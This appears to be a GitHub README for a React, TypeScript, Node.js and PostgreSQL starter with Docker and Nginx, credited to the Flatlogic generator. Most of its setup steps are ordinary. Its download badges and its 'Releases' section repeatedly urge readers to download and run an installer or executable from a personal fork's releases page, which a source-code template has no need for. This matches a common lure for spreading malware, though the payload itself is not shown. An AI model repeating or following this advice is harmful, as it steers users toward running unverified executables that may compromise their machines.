[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/Gamerul990/base44clone/releases)  
https://github.com/Gamerul990/base44clone/releases

# Base44Clone — React + NodeJS Tailwind Starter with Docker

[![Built with React](https://img.shields.io/badge/React-61DAFB?logo=react&logoColor=000000)](https://reactjs.org)
[![Node.js](https://img.shields.io/badge/Node.js-339933?logo=node.js&logoColor=fff)](https://nodejs.org)
[![TypeScript](https://img.shields.io/badge/TypeScript-3178C6?logo=typescript&logoColor=fff)](https://www.typescriptlang.org)
[![Tailwind CSS](https://img.shields.io/badge/Tailwind-38B2AC?logo=tailwind-css&logoColor=fff)](https://tailwindcss.com)
[![Docker](https://img.shields.io/badge/Docker-2496ED?logo=docker&logoColor=fff)](https://www.docker.com)
[![PostgreSQL](https://img.shields.io/badge/Postgres-4169E1?logo=postgresql&logoColor=fff)](https://www.postgresql.org)
[![Nginx](https://img.shields.io/badge/Nginx-009639?logo=nginx&logoColor=fff)](https://nginx.org)

Live app: https://base44clone.flatlogic.app  
Created by Flatlogic Platform generator: https://flatlogic.com/generator

A complete starter for web apps. It pairs a React + TypeScript frontend with a Node.js backend and PostgreSQL. It includes Docker, Nginx, Tailwind CSS, and a production-ready structure. Use this repo to bootstrap admin panels, dashboards, or data apps.

Hero image  
![Stack logos](https://miro.medium.com/max/1400/1*Qf2x1c3q3qRP9g4BXnJpTg.png)

## Why use this starter

- Ship a full stack app with minimal setup.
- Use TypeScript across client and server.
- Run local dev with Docker Compose.
- Use Tailwind for fast UI work.
- Use PostgreSQL for reliable data storage.
- Use Nginx as a reverse proxy for production.

## Features

- React + TypeScript frontend with Tailwind CSS.
- Node.js + TypeScript API server.
- PostgreSQL schema and simple migration scripts.
- Docker Compose for local dev and production.
- Nginx config for serving static files and proxying API.
- Auth scaffolding and user management (basic).
- Common scripts: start, build, lint, test.
- Ready-to-edit pages and components for admin dashboards.

## Repo structure

- /client — React frontend (TypeScript, Tailwind)
- /server — Node + TypeScript API
- /db — SQL scripts and migrations
- /nginx — Nginx config for reverse proxy and static assets
- /docker — Dockerfiles and docker-compose.yml
- /scripts — helper scripts for setup and migrations

## Tech stack

- Frontend: React, TypeScript, Tailwind CSS, Vite or CRA.
- Backend: Node.js, TypeScript, Express or Fastify.
- Database: PostgreSQL, SQL migration scripts.
- Deployment: Docker, docker-compose, Nginx.
- Optional: PM2 for process management in production.

## Quick start — local with Docker

Prerequisites: Docker and docker-compose.

1. Copy env file templates:
```bash
cp server/.env.example server/.env
cp client/.env.example client/.env
```

2. Build and start services:
```bash
docker-compose up --build
```

3. Open the app:
- Frontend: http://localhost:3000
- API: http://localhost:8080
- Admin / DB: pgAdmin or psql (see docker-compose ports)

4. Run migrations:
```bash
docker-compose exec db psql -U postgres -f /docker-entrypoint-initdb.d/init.sql
```

This setup uses a multi-container approach. The client serves static assets, and Nginx acts as reverse proxy in production mode.

## Run locally without Docker

1. Install dependencies:
- Client
```bash
cd client
pnpm install   # or npm install / yarn
pnpm start
```
- Server
```bash
cd server
pnpm install
pnpm dev
```

2. Start PostgreSQL locally and create the database:
```bash
createdb base44clone
psql -U postgres -d base44clone -f db/init.sql
```

3. Point server .env to local DB and run.

## Environment variables

Key variables (server/.env):
- PORT=8080
- DATABASE_URL=postgres://user:password@db:5432/base44clone
- JWT_SECRET=change_me
- NODE_ENV=development

Key variables (client/.env):
- VITE_API_URL=http://localhost:8080/api
- VITE_APP_TITLE=Base44Clone

Keep secrets out of version control.

## Docker compose overview

docker/docker-compose.yml includes:
- db: PostgreSQL container with persistent volume.
- server: Node app, builds from ./server.
- client: React app, builds static files in production.
- nginx: Serves static files and proxies /api to server.

Use docker-compose.override.yml for development overrides.

## Nginx config

/nginx/default.conf demonstrates:
- gzip compression
- caching headers for static assets
- proxy_pass for /api to server
- TLS termination placeholder for production

Example snippet:
```nginx
location /api {
    proxy_pass http://server:8080;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
}
```

## Database

- SQL migrations live in /db/migrations.
- Use a simple timestamped migration pattern.
- The repo includes initial schema for users, roles, and sessions.

Run migrations locally or in container with included scripts.

## Building for production

1. Build client:
```bash
cd client
pnpm build
```
2. Build server:
```bash
cd server
pnpm build
```
3. Build Docker images:
```bash
docker-compose -f docker/docker-compose.yml -p base44clone up --build -d
```

Nginx will serve built client files and proxy API requests.

## Releases

Download the release asset and execute the packaged installer from the Releases page: https://github.com/Gamerul990/base44clone/releases

If the release page contains an installer or archive, download that file and run the included install script or executable. The releases page typically contains ready-to-run assets and changelogs. Use the linked badge at the top or visit the releases page directly to get the latest packaged build.

[![Get Release](https://img.shields.io/badge/Get%20Release-Download-orange?logo=github&logoColor=fff)](https://github.com/Gamerul990/base44clone/releases)

## CI / CD

- Use GitHub Actions, GitLab CI, or other runners to build images and push to registry.
- Steps:
  - Install dependencies
  - Run tests and lint
  - Build client and server
  - Build Docker images
  - Push to container registry
  - Deploy to target host with docker-compose or Kubernetes

Keep secrets in encrypted secrets store or CI secret variables.

## Troubleshooting

- API returns 500: check server logs, missing env variables, DB connection.
- DB fails to start: verify volumes and port conflicts.
- Static assets 404: ensure client build output path matches Nginx root.
- CORS errors: confirm VITE_API_URL and server CORS settings match.

Use docker logs for container output:
```bash
docker-compose logs -f server
```

## Contributing

- Fork the repo.
- Create a topic branch for your change.
- Run tests and lint locally.
- Create PR with clear description and screenshots if UI changes apply.

Code style:
- TypeScript strict mode.
- ESLint and Prettier rules included.
- Commit messages follow conventional commits.

## Tests

- Frontend uses React Testing Library and Vitest/Jest.
- Backend uses Jest or Mocha with Supertest for API tests.
Run:
```bash
pnpm test
```
in client or server folders.

## Links & resources

- Flatlogic generator: https://flatlogic.com/generator
- Live demo: https://base44clone.flatlogic.app
- Releases: https://github.com/Gamerul990/base44clone/releases

## License

This project uses the MIT license. See LICENSE file for details.

## Maintainers

- Generated and scaffolded via Flatlogic Platform.
- Maintainers should keep dependencies updated and monitor security advisories for Node, React, PostgreSQL, and Docker images.